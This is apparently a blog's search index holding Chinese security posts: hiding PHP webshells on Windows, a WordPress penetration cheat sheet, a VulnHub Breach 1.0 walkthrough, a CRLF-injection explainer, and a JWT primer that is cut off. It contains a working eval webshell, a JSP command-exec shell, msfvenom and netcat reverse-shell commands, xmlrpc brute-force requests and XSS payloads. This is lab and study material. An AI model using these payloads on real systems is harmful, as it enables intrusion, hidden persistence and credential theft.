<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Windows主机下隐藏木马</title>
    <url>/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/</url>
    <content><![CDATA[<p>接上文（<a href="https://lxh3ng.github.io/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/">Pikachu：远程文件包含写入木马</a>）在目录下创建了shell.php后</p>
<h2 id="隐藏文件夹隐藏Webshell"><a href="#隐藏文件夹隐藏Webshell" class="headerlink" title="隐藏文件夹隐藏Webshell"></a>隐藏文件夹隐藏Webshell</h2><p>打开蚁剑终端</p>
<pre class=" language-shell"><code class="language-shell">mkdir tmp #创建隐藏文件夹,此时尚未隐藏
cd tmp #进入创建的文件夹
echo ^<?php @eval($_POST["shell"]);?^> >>shell.php#写入Webshell至tmp目录下
cd ../ #返回上一级目录
attrib +s +a +h +r tmp #对创建的文件夹进行隐藏</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/1.png" alt="img"></p>
<p>我打开了显示隐藏文件，还是看不到的</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/2.png" alt="2"></p>
<p>新的路径蚁剑可以连接：</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/3.png" alt="3"></p>
<p>win11打开显示隐藏查看不到，但是可以通过路径直接访问</p>
<h2 id="利用系统代号隐藏Webshell"><a href="#利用系统代号隐藏Webshell" class="headerlink" title="利用系统代号隐藏Webshell"></a>利用系统代号隐藏Webshell</h2><p>特殊文件名的代号</p>
<pre class=" language-windows"><code class="language-windows">我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
回收站.{645ff040-5081-101b-9f08-00aa002f954e}
拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
打印机.{2227a280-3aea-1069-a2de-08002b30309d}
控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}</code></pre>
<p>新建文件夹命名<code>我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code>会变成我的电脑</p>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/4.png" alt="4"></p>
<p>通过拼接文件夹名,使用中国蚁剑进行木马连接,例如</p>
<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//。。。。。。。/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell.php</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/5.png" alt="5"></p>
<h2 id="畸形目录隐藏Webshell"><a href="#畸形目录隐藏Webshell" class="headerlink" title="畸形目录隐藏Webshell"></a>畸形目录隐藏Webshell</h2><p>创建畸形目录</p>
<pre class=" language-shell"><code class="language-shell">mkdir a...\</code></pre>
<p>Copy命令将木马移动到畸形目录下</p>
<pre class=" language-shell"><code class="language-shell">copy b.asp</code></pre>
<p>删除方法：</p>
<pre class=" language-shell"><code class="language-shell">rd /s /q a...\</code></pre>
<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/6.png" alt="6"></p>
<h2 id="利用系统保留名制作不死Webshell"><a href="#利用系统保留名制作不死Webshell" class="headerlink" title="利用系统保留名制作不死Webshell"></a>利用系统保留名制作不死Webshell</h2><p>在Windows操作系统中,是不能以下形式创建文件的,比如aux,com1,com2,prn,con,nul等.但是在cmd目录下可以通过copy语句创建,这类文件无法在图形化界面被删除,只能在命令行中被删除. 创建不死Webshell命令如下:</p>
<pre class=" language-shell"><code class="language-shell">copy shell.php \\.\D:\phpStudy\PHPTutorial\WWW\pikachu\vul\fileinclude\1.php</code></pre>
<p>我的win11没有复现成功</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY3MzcwMQ==&amp;mid=2247484784&amp;idx=3&amp;sn=8fc983d40d91b7a9a7eb709e65c944cd&amp;chksm=cf116f3af866e62c90285b409378aabfc55d708ea0606b9c81630e52cb1ca4c059027849907d&amp;mpshare=1&amp;scene=23&amp;srcid=0103GMx84FrUrfZnWKJpp0Jl&amp;sharer_sharetime=1641200593711&amp;sharer_shareid=992c19d88a5a27647ec75d14d60782cb#rd">Th0r：Windows下木马隐藏小技巧</a></p>
]]></content>
  </entry>
  <entry>
    <title>Wordpress渗透指南</title>
    <url>/2022/09/19/wordpress-shen-tou-zhi-nan/wordpress-shen-tou-zhi-nan/</url>
    <content><![CDATA[<h2 id="如何挖掘Wordpress网站的漏洞"><a href="#如何挖掘Wordpress网站的漏洞" class="headerlink" title="如何挖掘Wordpress网站的漏洞"></a>如何挖掘Wordpress网站的漏洞</h2><p>如果您访问<a href="https://target.com并查看源代码,您将看到来自/">https://target.com并查看源代码，您将看到来自</a> WordPress 的主题和插件的链接。</p>
<p>或者你可以访问<a href="https://target.com/wp-login.php%EF%BC%8C%E5%AE%83%E6%98%AF">https://target.com/wp-login.php，它是</a> WordPress 登录管理页面</p>
<p>通过查看核心、插件和主题版本找到相关的CVE</p>
<h2 id="如何找到wordpress版本"><a href="#如何找到wordpress版本" class="headerlink" title="如何找到wordpress版本"></a>如何找到wordpress版本</h2><pre><code>https://target.com/feed 
https://target.com/?feed=rss2</code></pre>
<h2 id="如何找到插件版本"><a href="#如何找到插件版本" class="headerlink" title="如何找到插件版本"></a>如何找到插件版本</h2><pre><code>https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT</code></pre>
<h2 id="如何找到主题版本"><a href="#如何找到主题版本" class="headerlink" title="如何找到主题版本"></a>如何找到主题版本</h2><pre><code>https://target.com/wp-content/themes/THEMENAME/style.css 
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)</code></pre>
<p>如果您发现过时的核心/插件/主题，请在<a href="https://wpscan.com找到漏洞利用/">https://wpscan.com找到漏洞利用</a></p>
<h2 id="查找日志文件"><a href="#查找日志文件" class="headerlink" title="查找日志文件"></a>查找日志文件</h2><pre><code>http://target.com/wp-content/debug.log</code></pre>
<h2 id="查找备份文件-wp-config"><a href="#查找备份文件-wp-config" class="headerlink" title="查找备份文件 wp-config"></a>查找备份文件 wp-config</h2><pre><code>http://target.com/.wp-config.php.swp
http://target.com/wp-config.inc
http://target.com/wp-config.old
http://target.com/wp-config.txt
http://target.com/wp-config.html
http://target.com/wp-config.php.bak
http://target.com/wp-config.php.dist
http://target.com/wp-config.php.inc
http://target.com/wp-config.php.old
http://target.com/wp-config.php.save
http://target.com/wp-config.php.swp
http://target.com/wp-config.php.txt
http://target.com/wp-config.php.zip
http://target.com/wp-config.php.html
http://target.com/wp-config.php~</code></pre>
<h2 id="获取网站上的用户名"><a href="#获取网站上的用户名" class="headerlink" title="获取网站上的用户名"></a>获取网站上的用户名</h2><pre><code>http://target.com/?author=1</code></pre>
<p>或者</p>
<pre><code>http://target.com/wp-json/wp/v2/users http://target.com/?rest_route=/wp/v2/users</code></pre>
<h2 id="爆破后台账号密码"><a href="#爆破后台账号密码" class="headerlink" title="爆破后台账号密码"></a>爆破后台账号密码</h2><pre class=" language-AB"><code class="language-AB">POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%</code></pre>
<p>or</p>
<pre><code>POST /xmlrpc.php HTTP/1.1
Host: target.com

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodCall&gt; 
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; 
&lt;params&gt; 
&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt; 
&lt;param&gt;&lt;value&gt;BRUTEFORCE_IN_HERE&lt;/value&gt;&lt;/param&gt; 
&lt;/params&gt; 
&lt;/methodCall&gt;</code></pre>
<h2 id="wordpress-中的-XSPA"><a href="#wordpress-中的-XSPA" class="headerlink" title="wordpress 中的 XSPA"></a>wordpress 中的 XSPA</h2><pre><code>POST /xmlrpc.php HTTP/1.1
Host: target.com

&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://yourip:port&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;
&lt;value&gt;
&lt;string&gt;https://target.com&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;</code></pre>
<h2 id="注册启用"><a href="#注册启用" class="headerlink" title="注册启用"></a>注册启用</h2><pre><code>http://example.com/wp-login.php?action=register</code></pre>
<p>来源</p>
<p><a href="https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg">https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg</a></p>
]]></content>
  </entry>
  <entry>
    <title>Vulnhub Breach 1.0</title>
    <url>/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/</url>
    <content><![CDATA[<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><p><a href="https://download.vulnhub.com/breach/Breach-1.0.zip">https://download.vulnhub.com/breach/Breach-1.0.zip</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>vmware导入下载解压后的ova文件</p>
<p>设置host-only模式，设置ip 192.168.110.0（breach静态地址192.168.110.140）</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921000956643.png" alt="image-20220921000956643"></p>
<ul>
<li>攻击机IP：192.168.110.128</li>
<li>靶机IP：192.168.110.140</li>
</ul>
<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>开启breach</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921001107489.png" alt="image-20220921001107489"></p>
<p>访问192.168.110.140web服务</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921001314088.png" alt="image-20220921001314088"></p>
<p>f12中发现base64字符串 解密后<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
<p>后台登录发现第三封邮件存在一份ssl证书<code>192.168.110.140/.keystore</code></p>
<pre><code>http://192.168.110.140/impresscms/readpmsg.php?start=0&amp;total_messages=3</code></pre>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920162607332.png" alt="image-20220920162607332"></p>
<p>发现一个流量包</p>
<pre><code>http://192.168.110.140/impresscms/modules/content/content.php?content_id=1</code></pre>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920162617863.png" alt="image-20220920162617863"></p>
<ul>
<li><code>_SSL_test_phase1.pcap</code>一个流量包，此流量包为黑客留下。</li>
</ul>
<p>jdk/bin目录下的keytool.exe可以用来查看和导入证书</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171559066.png" alt="image-20220920171559066"></p>
<p>导出该证书，重命名为：<code>keystore.p12</code>（<code>.p12</code>它是保存私钥和证书的组合格式，是最新的签名实用程序使用的格式）</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171541856.png" alt="image-20220920171541856"></p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171531050.png" alt="image-20220920171531050"></p>
<p><code>wireshark-&gt;编辑-&gt;首选项-&gt;Protocols-&gt;TLS</code>添加此p12证书</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920170128933.png" alt="image-20220920170128933"></p>
<p>导入后发现之前加密后的部分TLS变成了HTTP</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921002500753.png" alt="image-20220921002500753"></p>
<p>发现一个命令执行的包，两个疑似图片马，还有一个Unauthorized认证包</p>
<pre><code>https://192.168.110.140:8443/_M@nag3Me/html</code></pre>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921002842058.png" alt="image-20220921002842058"></p>
<p>basic加密的账号密码</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003003606.png" alt="image-20220921003003606"></p>
<p>登录后台</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003042121.png" alt="image-20220921003042121"></p>
<p>常规上传jsp马生成成war包，发现会被删除</p>
<pre class=" language-jsp"><code class="language-jsp"><%
    if("000".equals(request.getParameter("a"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%></code></pre>
<p>只能采用msf生成的war进行反弹shell</p>
<pre><code>msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=1234 -f war -o shell.war</code></pre>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003520314.png" alt="image-20220921003520314"></p>
<p>设置参数</p>
<pre><code>set LHOST 192.168.110.128
set LPORT 1234</code></pre>
<p>访问<a href="https://192.168.110.140:8443/shell/%EF%BC%8C%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell">https://192.168.110.140:8443/shell/，成功反弹shell</a></p>
<p>将shell升级为 tty，得到一个交互式的shell：</p>
<pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003735683.png" alt="image-20220921003735683"></p>
<p>在/etc/passwd中发现两个用户</p>
<p>发现数据库连接文件</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004027920.png" alt="image-20220921004027920"></p>
<p>发现milton解密后的密码thelaststraw</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004054916.png" alt="image-20220921004054916"></p>
<p>登录后发现不属于sudo组</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004226756.png" alt="image-20220921004226756"></p>
<p>历史命令发现blumbergh可能有root权限</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004305363.png" alt="image-20220921004305363"></p>
<p>bill.png中找到了密码：<code>coffeestains</code></p>
<p>能够以root权限执行这tee程序和tidyup.sh脚本：<code>/usr/bin/tee</code>和<code>/usr/share/cleanup/tidyup.sh</code>，其中tee命令用于读取标准输入的数据，并将其内容输出成文件，tidyup.sh是清理脚本</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004425743.png" alt="image-20220921004425743"></p>
<ul>
<li><p>向tidyup.sh中写入反弹shell命令，由于能够以root权限运行tee命令，即可以用tee命令写tidyup.sh</p>
</li>
<li><p>先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：echo “nc -e /bin/bash 192.168.110.128 4321” &gt; shell.txt</p>
</li>
<li><p>再使用tee命令将shell.txt内容输出到tidyup.sh：cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</p>
</li>
</ul>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004548670.png" alt="image-20220921004548670"></p>
<p>起一个监听成功反弹shell<img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004640558.png" alt="image-20220921004640558"></p>
<p>root权限，提权结束</p>
<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004718401.png" alt="image-20220921004718401"></p>
]]></content>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF漏洞学习</title>
    <url>/2021/09/11/crlf-lou-dong-xue-xi/crlf-lou-dong-xue-xi/</url>
    <content><![CDATA[<p>原文：<a href="https://link.jianshu.com/?t=http://www.codesec.net/view/50272.html">http://www.codesec.net/view/50272.html</a></p>
<p>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</p>
<p>HRS是比XSS危害更大的安全问题，具体是为什么，我们往下看。</p>
<p>对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss。</p>
<h3 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01 实例"></a>0x01 实例</h3><p> 举个例子，一般网站会在HTTP头中用Location:<a href="https://link.jianshu.com/?t=http://baidu.com">http://baidu.com</a>这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</p>
<p>所以一个正常的302跳转包是这样：</p>
<pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> 
Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMT 
Content<span class="token operator">-</span> Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> 
Connection<span class="token punctuation">:</span> close
Location<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn</code></pre>
<p>但如果我们输入的是</p>
<p>[<a href="http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun]</a>(<a href="https://link.jianshu.com/?t=http://www.sina.com.cn">https://link.jianshu.com?t=http://www.sina.com.cn</a> Set-cookie:JSPSESSID%3Dwooyun)<br> 注入了一个换行，此时的返回包就会变成这样：</p>
<pre class=" language-dart"><code class="language-dart">HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">302</span> Moved Temporarily Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">27</span> Jun <span class="token number">2014</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">17</span> GMT
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html 
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span> 
Connection<span class="token punctuation">:</span> close 
Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sina<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn Set<span class="token operator">-</span>cookie<span class="token punctuation">:</span> JSPSESSID<span class="token operator">=</span>wooyun</code></pre>
<p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p>
<p>当然，HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>比如一个网站接受url参数<a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=xxx">http://test.sina.com.cn/?url=xxx</a>，xxx放在Location后面作为一个跳转。如果我们输入的是</p>
<p><a href="https://link.jianshu.com/?t=http://test.sina.com.cn/?url=">http://test.sina.com.cn/?url=%0d%0a%0d%0a</a>&lt;imgsrc=1onerror=alert(/xss/)&gt;<br> 我们的返回包就会变成这样：</p>
<p>HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT  Content-Type: text/html Content-Length: 154 Connection: close Location:  <img src="/1" onerror="alert(/xss/)"><br> 之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。</p>
<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<p>所以说HRS的危害大于XSS，因为它能绕过一般XSS所绕不过的filter，并能产生会话固定漏洞。</p>
<p>我们来一个真实案例吧。 新浪某分站含有一个url跳转漏洞，危害并不大，于是我就想到了CRLFInjection，当我测试</p>
<p><a href="https://link.jianshu.com/?t=http://xxx.sina.com.cn/?url=">http://xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</a><br> 的时候，发现图片已经输出在页面中了，说明CRLF注入成功了：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-e18180bd46ba67d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/659" alt="img"></p>
<p>Paste_Image.png</p>
<p>那么我们试试XSS看看：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-2dfa3e0ca5f573d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/879" alt="img"></p>
<p>Paste_Image.png</p>
<p>@mramydnei还想到了一个利用字符编码来绕过XSSFilter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个</p>
<p>&lt;metacharset=ISO-2022-KR&gt;</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5557607-62d386e1e365d69a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/924" alt="img"></p>
<p>Paste_Image.png</p>
<p>当然，在Location:这里注入只有webkit内核浏览器才能够利用，其他浏览器可能会跳转、出错。不过对于chrome的使用量来说，危害已经足够了。</p>
<h3 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h3><p> 如何修复HRS漏洞，当然是过滤\r、\n之类的换行符，避免输入的数据污染到其他HTTP头</p>
]]></content>
  </entry>
  <entry>
    <title>JSON Web Token学习</title>
    <url>/2021/07/24/jwt-xue-xi/jwt-xue-xi/</url>
    <content><![CDATA[<h2 id="JSON-Web-Token的定义"><a href="#JSON-Web-Token的定义" class="headerlink" title="JSON Web Token的定义"></a>JSON Web Token的定义</h2><ul>
<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)</li>
<li>定义了一种紧凑的、自包含的方式</li>
<li>作为JSON对象在各方之间安全地传输信息</li>
<li>是数字签名 -&gt; 可以被验证和信任</li>
</ul>
<h2 id="JSON-Web-Token的使用场景"><a href="#JSON-Web-Token的使用场景" class="headerlink" title="JSON Web Token的使用场景"></a>JSON Web Token的使用场景</h2><ul>
<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
<li><strong>Information Exchange</strong> (信息交换) :JWTs可以被签名，例如，用公钥/私钥对，可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>
</ul>
<h2 id="JSON-Web-Token的结构"><a href="#JSON-Web-Token的结构" class="headerlink" title="JSON Web Token的结构"></a>JSON Web Token的结构</h2><p><img src="/JSON-Web-Token.assets/image-20210726041459952.png" alt="image-20210726041459952"></p>
<p>三部分 圆点连接</p>
<ol>
<li><strong>Header</strong></li>
<li><strong>Payload</strong></li>
<li><strong>Signature</strong></li>
</ol>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<pre><code>{
    "alg":"HS256",
    "typ":"JWT"
}</code></pre>
<p>对其进行base64编码后得到JWT第一部分</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
<li>Public claims : 可以随意定义。</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
</ul>
<p>例如：</p>
<pre><code>{
    "sub":"123456",
    "name":"CTF",
    "admin":ture
}</code></pre>
<p>对其进行base64得到JWT第二部分</p>
<p>注意：JWT的header或payload勿放置未加密的敏感信息。</p>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>signature由base64(header)，base64(payload)和秘钥组成，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<pre><code>HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)</code></pre>
<p><img src="/JSON-Web-Token.assets/image-20210726042519069.png" alt="image-20210726042519069"></p>
<p><img src="/JSON-Web-Token.assets/image-20210726043023893.png" alt="image-20210726043023893"></p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiemhhbmdzYW4iLCJjb2RlIjoiMjEyMzQxMCJ9.aaa</code></pre>
<h2 id="JSON-Web-Token的工作"><a href="#JSON-Web-Token的工作" class="headerlink" title="JSON Web Token的工作"></a>JSON Web Token的工作</h2><ol>
<li><p>用户登录</p>
</li>
<li><p>返回JWT</p>
</li>
<li><p>token成为用户凭证（保存令牌不应超过需要时间）</p>
</li>
<li><p>访问受保护的路由或者资源，JWT放在Authorization header中，用Bearer schema。</p>
<img src="/JSON-Web-Token.assets/image-20210726043710776.png" alt="image-20210726043710776" style="zoom: 67%;">
</li>
<li><p>服务器检查JWT是否有效</p>
<p>如果token是在授权头（Authorization header）中发送的，那么跨源资源共享(CORS)将不会成为问题，因为它不使用cookie</p>
<img src="/JSON-Web-Token.assets/image-20210726043830317.png" alt="image-20210726043830317" style="zoom:67%;">

<ul>
<li>应用（或者客户端）想授权服务器请求授权。例如，如果用授权码流程的话，就是/oauth/authorize</li>
<li>当授权被许可以后，授权服务器返回一个access token给应用</li>
<li>应用使用access token访问受保护的资源（比如：API）</li>
</ul>
</li>
</ol>
<h2 id="基于Token的身份认证-与-基于服务器的身份认证"><a href="#基于Token的身份认证-与-基于服务器的身份认证" class="headerlink" title="基于Token的身份认证 与 基于服务器的身份认证"></a>基于Token的身份认证 与 基于服务器的身份认证</h2><h3 id="基于服务器的身份认证"><a href="#基于服务器的身份认证" class="headerlink" title="基于服务器的身份认证"></a>基于服务器的身份认证</h3><p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p>
<p>这种基于服务器的身份认证方式存在一些问题：</p>
<ul>
<li>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</li>
<li>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</li>
<li>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</li>
<li>CSRF : 用户很容易受到CSRF攻击。</li>
</ul>
<h3 id="JWT与Session的差异"><a href="#JWT与Session的差异" class="headerlink" title="JWT与Session的差异"></a>JWT与Session的差异</h3><p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。</p>
<p>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。</p>
<p>而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>
<p>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
<p><img src="/JSON-Web-Token.assets/image-20210726044027547.png" alt="image-20210726044027547"></p>
<h3 id="基于Token的身份认证是如何工作的"><a href="#基于Token的身份认证是如何工作的" class="headerlink" title="基于Token的身份认证是如何工作的"></a>基于Token的身份认证是如何工作的</h3><p>基于Token的身份认证是无状态的，服务器或者Session中不会存储任何用户信息。</p>
<blockquote>
